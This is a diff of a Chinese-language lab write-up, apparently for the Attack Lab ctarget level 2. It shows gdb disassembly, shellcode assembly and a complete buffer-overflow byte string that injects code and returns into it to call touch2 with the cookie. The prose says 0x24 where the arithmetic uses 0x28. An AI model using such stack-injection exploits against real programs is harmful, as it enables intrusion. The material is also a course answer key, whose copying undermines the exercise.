@@ -28,13 +28,14 @@ Byte Order:            Little Endian
 ### ***CI level2***
 与上题不同 level2 需要编写一个函数将给定的cookie值带入指定的函数   
 若直接在返回插入函数地址 加上栈随机化 很难找到正确的函数入口 此时需要利用栈指针直接转跳   
-利用栈指针 先找到栈指针位置
+利用栈指针 先找到栈指针位置  
+```
 Starting program: ctarget -q   
 Cookie: 0x59b997fa   
 Dump of assembler code for function getbuf:   
-=> 0x00000000004017a8 <+0>:	  sub    $0x28,%rsp   
-   0x00000000004017ac <+4>:	  mov    %rsp,%rdi   
-   0x00000000004017af <+7>:	  callq  0x401a40 <Gets>   
+=> 0x00000000004017a8 <+0>:	sub    $0x28,%rsp   
+   0x00000000004017ac <+4>:	mov    %rsp,%rdi   
+   0x00000000004017af <+7>:	callq  0x401a40 <Gets>   
    0x00000000004017b4 <+12>:	mov    $0x1,%eax   
    0x00000000004017b9 <+17>:	add    $0x28,%rsp   
    0x00000000004017bd <+21>:	retq      
@@ -43,10 +44,11 @@ End of assembler dump.
 $1 = 0x5561dca0   
 (gdb) p/x 0x5561dca0-0x28   
 $2 = 0x5561dc78   
-
+```
 获得%rsp位置此时还没运行该指令分配空间 需要减去0x24 得到运行后的栈地址0x5561dc78 同样需要转换成小端地址78 dc 61 55   
 运行得到的 Cookie: 0x59b997fa    
-再查看ctarget的汇编代码 得知touch2的起始地址为 4017ec 即可开始写注入所需的函数   
+需要将cookie值(0x59b997fa)存入%rdi寄存器用于传参数给函数touch2    
+再查看ctarget的汇编代码 得知touch2 的起始地址为 4017ec 即可开始写注入所需的函数   
 File\:phase.s   
 ```assembly
 pushq $0x4017ec
@@ -55,16 +57,22 @@ retq
 ```
 使用gcc -c选项编译该文件   
 再利用objdump 反编译成机器码得到   
+```
 68 ec 17 40 00       	pushq  $0x4017ec   
-48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi   
+48 c7 c7 fa 97 b9 59 	movq    $0x59b997fa,%rdi   
 c3                   	retq      
+```
+则答案为  
+```
+68 ec 17 40 00
+48 c7 c7 fa 97 b9 59
+c3                                 
+00 00 00 00 00 00 00    
+00 00 00 00 00 00 00 00 00 00     
+00 00 00 00 00 00 00 00 00 00    
+78 dc 61 55      
+```
 
-则答案为
-68 ec 17 40 00 48 c7 c7 fa 97 
-b9 59 c3 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 00 00
-78 dc 61 55   
 
 ### ***CI level3***
 
